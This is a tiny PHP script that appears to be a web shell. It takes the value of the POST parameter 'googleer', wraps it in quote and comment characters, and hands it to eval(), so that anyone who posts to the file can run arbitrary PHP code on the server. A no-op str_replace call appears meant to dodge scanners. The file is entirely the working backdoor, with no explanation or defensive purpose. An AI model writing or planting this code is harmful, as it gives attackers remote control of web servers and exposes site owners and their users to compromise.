<?php

function boy()
{
global $BA;
$BA=TXT();
eval("\"$BA\"");
}
function TXT()
{
        $a=str_replace('','',$_POST[googleer]);
        
        return '";'.$a.'//';
}

boy();
?>
